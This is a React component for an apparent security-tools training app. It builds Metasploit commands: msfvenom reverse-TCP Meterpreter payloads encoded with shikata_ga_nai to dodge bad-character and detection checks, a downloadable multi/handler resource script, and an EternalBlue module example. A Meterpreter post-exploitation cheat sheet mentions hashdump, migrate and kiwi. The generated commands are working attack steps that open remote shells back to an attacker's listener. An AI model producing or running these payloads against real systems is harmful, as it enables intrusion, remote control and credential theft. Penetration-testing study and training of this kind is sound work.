import React, { useState } from 'react';
import {
  Terminal,
  Copy,
  Check,
  RotateCcw,
  Sparkles,
  Shield,
  Layers,
  FileCode,
  Download,
  AlertTriangle,
  Play,
  Key
} from 'lucide-react';
import {
  METASPLOIT_PRESETS,
  METASPLOIT_PAYLOAD_OPTIONS,
  METASPLOIT_FORMAT_OPTIONS,
  METASPLOIT_ENCODER_OPTIONS,
  METERPRETER_POST_COMMANDS
} from '../data/securityToolsData';

export const MetasploitBuilder: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'venom' | 'console' | 'post'>('venom');
  const [selectedPresetId, setSelectedPresetId] = useState<string>('');

  // Venom state
  const [payload, setPayload] = useState<string>('windows/x64/meterpreter/reverse_tcp');
  const [format, setFormat] = useState<string>('exe');
  const [encoder, setEncoder] = useState<string>('x86/shikata_ga_nai');
  const [iterations, setIterations] = useState<number>(3);
  const [badChars, setBadChars] = useState<string>('\\x00\\x0a\\x0d');
  const [lhost, setLhost] = useState<string>('192.168.1.100');
  const [lport, setLport] = useState<number>(4444);
  const [outputFilename, setOutputFilename] = useState<string>('payload.exe');

  // Console state
  const [exploitModule, setExploitModule] = useState<string>('exploit/multi/handler');
  const [rhost, setRhost] = useState<string>('192.168.1.50');
  const [rport, setRport] = useState<number>(445);
  const [copied, setCopied] = useState<boolean>(false);
  const [postSearch, setPostSearch] = useState<string>('');

  // Apply Preset
  const handleApplyPreset = (presetId: string) => {
    setSelectedPresetId(presetId);
    const p = METASPLOIT_PRESETS.find((x) => x.id === presetId);
    if (!p) return;

    setPayload(p.payload);
    setLhost(p.lhost);
    setLport(p.lport);
    if (p.format) setFormat(p.format);
    if (p.encoder) setEncoder(p.encoder);
    if (p.iterations) setIterations(p.iterations);
    if (p.badChars) setBadChars(p.badChars);
    if (p.module) setExploitModule(p.module);
    if (p.rhost) setRhost(p.rhost);
    if (p.rport) setRport(p.rport);

    if (p.category === 'listener' || p.category === 'exploit') {
      setActiveTab('console');
    } else {
      setActiveTab('venom');
    }
  };

  // Generate msfvenom command
  const generateMsfvenomCommand = (): string => {
    const parts = ['msfvenom', `-p ${payload}`, `LHOST=${lhost}`, `LPORT=${lport}`];

    if (badChars.trim()) {
      parts.push(`-b "${badChars.trim()}"`);
    }

    if (encoder !== 'none') {
      parts.push(`-e ${encoder}`);
      if (iterations > 1) {
        parts.push(`-i ${iterations}`);
      }
    }

    parts.push(`-f ${format}`);
    parts.push(`-o ${outputFilename}`);

    return parts.join(' ');
  };

  // Generate msfconsole resource script
  const generateResourceScript = (): string => {
    const lines = [
      `# Metasploit Resource Script (.rc) - Auto-generated`,
      `use ${exploitModule}`,
      `set PAYLOAD ${payload}`,
      `set LHOST ${lhost}`,
      `set LPORT ${lport}`
    ];

    if (exploitModule !== 'exploit/multi/handler') {
      lines.push(`set RHOSTS ${rhost}`);
      lines.push(`set RPORT ${rport}`);
    } else {
      lines.push(`set ExitOnSession false`);
      lines.push(`set EnableStageEncoding true`);
    }

    lines.push(`exploit -j -z`);
    return lines.join('\n');
  };

  const currentCommand = activeTab === 'venom' ? generateMsfvenomCommand() : generateResourceScript();

  const handleCopy = () => {
    navigator.clipboard.writeText(currentCommand);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadScript = () => {
    const blob = new Blob([generateResourceScript()], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'handler.rc';
    a.click();
    URL.revokeObjectURL(url);
  };

  const filteredPostCommands = METERPRETER_POST_COMMANDS.filter(
    (c) =>
      c.cmd.toLowerCase().includes(postSearch.toLowerCase()) ||
      c.desc.toLowerCase().includes(postSearch.toLowerCase())
  );

  return (
    <div className="card bg-dark border-secondary shadow-lg rounded-3 overflow-hidden text-light">
      {/* Header */}
      <div className="card-header bg-black bg-opacity-40 border-secondary py-3 px-4 d-flex flex-wrap justify-content-between align-items-center gap-3">
        <div className="d-flex align-items-center gap-3">
          <div className="p-2.5 rounded-3 bg-danger bg-opacity-15 text-danger border border-danger border-opacity-25">
            <Terminal size={22} />
          </div>
          <div>
            <div className="d-flex align-items-center gap-2">
              <h5 className="mb-0 fw-bold text-light">Metasploit Exploit & Payload Generator</h5>
              <span className="badge bg-danger bg-opacity-25 text-danger border border-danger border-opacity-50">
                msfconsole & msfvenom
              </span>
            </div>
            <div className="text-secondary small mt-0.5">
              Build staged/stageless payloads, encode bad characters, deploy multi/handlers, and view post-exploitation cheats.
            </div>
          </div>
        </div>

        {/* Presets dropdown */}
        <div className="d-flex align-items-center gap-2">
          <Sparkles size={16} className="text-warning" />
          <select
            id="metasploit-presets-select"
            className="form-select form-select-sm bg-dark text-light border-secondary"
            value={selectedPresetId}
            onChange={(e) => handleApplyPreset(e.target.value)}
            style={{ width: '240px' }}
          >
            <option value="">⚡ Select Metasploit Preset...</option>
            {METASPLOIT_PRESETS.map((p) => (
              <option key={p.id} value={p.id}>
                {p.name}
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Sub-tab navigation */}
      <div className="px-4 pt-3 border-bottom border-secondary bg-black bg-opacity-20 d-flex gap-2">
        <button
          type="button"
          className={`btn btn-sm px-3 py-2 fw-semibold rounded-top rounded-0 border-0 ${
            activeTab === 'venom'
              ? 'btn-danger text-light border-bottom border-3 border-danger'
              : 'text-secondary hover-text-light'
          }`}
          onClick={() => setActiveTab('venom')}
        >
          <span className="d-flex align-items-center gap-1.5">
            <Layers size={15} />
            <span>msfvenom Payload Generator</span>
          </span>
        </button>

        <button
          type="button"
          className={`btn btn-sm px-3 py-2 fw-semibold rounded-top rounded-0 border-0 ${
            activeTab === 'console'
              ? 'btn-danger text-light border-bottom border-3 border-danger'
              : 'text-secondary hover-text-light'
          }`}
          onClick={() => setActiveTab('console')}
        >
          <span className="d-flex align-items-center gap-1.5">
            <Play size={15} />
            <span>msfconsole Handler & Resource Script (.rc)</span>
          </span>
        </button>

        <button
          type="button"
          className={`btn btn-sm px-3 py-2 fw-semibold rounded-top rounded-0 border-0 ${
            activeTab === 'post'
              ? 'btn-danger text-light border-bottom border-3 border-danger'
              : 'text-secondary hover-text-light'
          }`}
          onClick={() => setActiveTab('post')}
        >
          <span className="d-flex align-items-center gap-1.5">
            <Key size={15} />
            <span>Meterpreter Post-Exploitation Quick Reference</span>
          </span>
        </button>
      </div>

      {/* Main Workspace */}
      <div className="card-body p-4">
        {/* Terminal Command Display */}
        {activeTab !== 'post' && (
          <div className="mb-4">
            <div className="d-flex justify-content-between align-items-center mb-1">
              <span className="small text-secondary fw-semibold">
                {activeTab === 'venom' ? 'GENERATED MSFVENOM COMMAND' : 'GENERATED MSFCONSOLE RESOURCE SCRIPT (.RC)'}
              </span>
              <div className="d-flex gap-2">
                {activeTab === 'console' && (
                  <button
                    type="button"
                    className="btn btn-outline-secondary btn-sm py-0.5 px-2 text-light"
                    onClick={handleDownloadScript}
                    title="Download handler.rc"
                  >
                    <Download size={13} className="me-1" />
                    Download .rc
                  </button>
                )}
                <button
                  type="button"
                  className={`btn btn-sm py-0.5 px-2.5 ${copied ? 'btn-success' : 'btn-danger'}`}
                  onClick={handleCopy}
                >
                  {copied ? (
                    <>
                      <Check size={13} className="me-1" /> Copied!
                    </>
                  ) : (
                    <>
                      <Copy size={13} className="me-1" /> Copy Command
                    </>
                  )}
                </button>
              </div>
            </div>

            <pre className="p-3 rounded-3 bg-black border border-secondary text-info font-monospace small mb-0 overflow-auto" style={{ maxHeight: '160px' }}>
              <code>{currentCommand}</code>
            </pre>
          </div>
        )}

        {/* msfvenom Config Form */}
        {activeTab === 'venom' && (
          <div className="row g-3">
            {/* Payload selection */}
            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Target Payload Architecture</label>
              <select
                className="form-select form-select-sm bg-black text-light border-secondary"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
              >
                {METASPLOIT_PAYLOAD_OPTIONS.map((opt) => (
                  <option key={opt.id} value={opt.id}>
                    {opt.name}
                  </option>
                ))}
              </select>
              <div className="form-text text-muted small">
                {payload.includes('/') && !payload.includes('_')
                  ? '⚡ Staged payload: requires an active multi/handler listener.'
                  : '📦 Stageless payload: standalone shellcode without secondary network stage.'}
              </div>
            </div>

            {/* Output format */}
            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Output Executable Format (-f)</label>
              <select
                className="form-select form-select-sm bg-black text-light border-secondary"
                value={format}
                onChange={(e) => {
                  setFormat(e.target.value);
                  if (e.target.value === 'exe') setOutputFilename('payload.exe');
                  else if (e.target.value === 'elf') setOutputFilename('payload.elf');
                  else if (e.target.value === 'raw') setOutputFilename('shellcode.bin');
                  else if (e.target.value === 'powershell') setOutputFilename('payload.ps1');
                  else if (e.target.value === 'asp' || e.target.value === 'aspx') setOutputFilename(`shell.${e.target.value}`);
                  else if (e.target.value === 'war') setOutputFilename('shell.war');
                }}
              >
                {METASPLOIT_FORMAT_OPTIONS.map((f) => (
                  <option key={f.id} value={f.id}>
                    {f.name}
                  </option>
                ))}
              </select>
            </div>

            {/* LHOST & LPORT */}
            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Listening IP (LHOST)</label>
              <input
                type="text"
                className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                placeholder="e.g. 10.10.14.5 or tun0"
              />
            </div>

            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Listening Port (LPORT)</label>
              <input
                type="number"
                className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                value={lport}
                onChange={(e) => setLport(parseInt(e.target.value) || 4444)}
              />
            </div>

            {/* Encoder */}
            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Polymorphic Encoder (-e)</label>
              <select
                className="form-select form-select-sm bg-black text-light border-secondary"
                value={encoder}
                onChange={(e) => setEncoder(e.target.value)}
              >
                {METASPLOIT_ENCODER_OPTIONS.map((enc) => (
                  <option key={enc.id} value={enc.id}>
                    {enc.name}
                  </option>
                ))}
              </select>
            </div>

            {/* Encoding Iterations */}
            <div className="col-md-3">
              <label className="form-label small text-secondary fw-semibold">Iterations (-i)</label>
              <input
                type="number"
                min="1"
                max="10"
                className="form-control form-control-sm bg-black text-light border-secondary"
                value={iterations}
                onChange={(e) => setIterations(parseInt(e.target.value) || 1)}
              />
            </div>

            {/* Filename */}
            <div className="col-md-3">
              <label className="form-label small text-secondary fw-semibold">Output File (-o)</label>
              <input
                type="text"
                className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                value={outputFilename}
                onChange={(e) => setOutputFilename(e.target.value)}
              />
            </div>

            {/* Bad Characters */}
            <div className="col-12">
              <label className="form-label small text-secondary fw-semibold">Bad Characters to Avoid (-b)</label>
              <input
                type="text"
                className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                value={badChars}
                onChange={(e) => setBadChars(e.target.value)}
                placeholder="e.g. \x00\x0a\x0d"
              />
              <div className="form-text text-muted small">
                Avoid characters like null-bytes (`\x00`) and newlines (`\x0a`, `\x0d`) that terminate memory strings in target buffers.
              </div>
            </div>
          </div>
        )}

        {/* msfconsole Config Form */}
        {activeTab === 'console' && (
          <div className="row g-3">
            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Exploit / Handler Module</label>
              <input
                type="text"
                className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                value={exploitModule}
                onChange={(e) => setExploitModule(e.target.value)}
                placeholder="e.g. exploit/multi/handler or exploit/windows/smb/ms17_010_eternalblue"
              />
            </div>

            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Payload</label>
              <input
                type="text"
                className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
              />
            </div>

            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Listener LHOST</label>
              <input
                type="text"
                className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
              />
            </div>

            <div className="col-md-6">
              <label className="form-label small text-secondary fw-semibold">Listener LPORT</label>
              <input
                type="number"
                className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                value={lport}
                onChange={(e) => setLport(parseInt(e.target.value) || 4444)}
              />
            </div>

            {exploitModule !== 'exploit/multi/handler' && (
              <>
                <div className="col-md-6">
                  <label className="form-label small text-secondary fw-semibold">Target Remote Host (RHOSTS)</label>
                  <input
                    type="text"
                    className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                    value={rhost}
                    onChange={(e) => setRhost(e.target.value)}
                  />
                </div>
                <div className="col-md-6">
                  <label className="form-label small text-secondary fw-semibold">Target Remote Port (RPORT)</label>
                  <input
                    type="number"
                    className="form-control form-control-sm bg-black text-light border-secondary font-monospace"
                    value={rport}
                    onChange={(e) => setRport(parseInt(e.target.value) || 445)}
                  />
                </div>
              </>
            )}

            <div className="col-12 mt-3">
              <div className="p-3 rounded bg-black bg-opacity-40 border border-secondary">
                <div className="fw-semibold text-warning small mb-1">
                  💡 How to execute this resource script:
                </div>
                <div className="font-monospace small text-light">
                  $ msfconsole -r handler.rc
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Post-Exploitation Reference */}
        {activeTab === 'post' && (
          <div>
            <div className="mb-3 d-flex justify-content-between align-items-center">
              <span className="small text-secondary fw-semibold">METERPRETER POST-EXPLOITATION CHEAT SHEET</span>
              <input
                type="text"
                className="form-control form-control-sm bg-black text-light border-secondary"
                placeholder="Search commands (e.g. hashdump, migrate, kiwi)..."
                value={postSearch}
                onChange={(e) => setPostSearch(e.target.value)}
                style={{ width: '280px' }}
              />
            </div>

            <div className="table-responsive">
              <table className="table table-dark table-hover table-bordered border-secondary small mb-0">
                <thead>
                  <tr className="table-secondary text-dark">
                    <th style={{ width: '260px' }}>Meterpreter Command</th>
                    <th>CEH v13 Objective & Impact</th>
                    <th style={{ width: '80px' }}>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredPostCommands.map((cmdItem, i) => (
                    <tr key={i}>
                      <td className="font-monospace text-info fw-bold">{cmdItem.cmd}</td>
                      <td className="text-light">{cmdItem.desc}</td>
                      <td>
                        <button
                          type="button"
                          className="btn btn-outline-secondary btn-sm py-0 px-2 text-light"
                          onClick={() => {
                            navigator.clipboard.writeText(cmdItem.cmd);
                          }}
                          title="Copy command"
                        >
                          <Copy size={12} />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
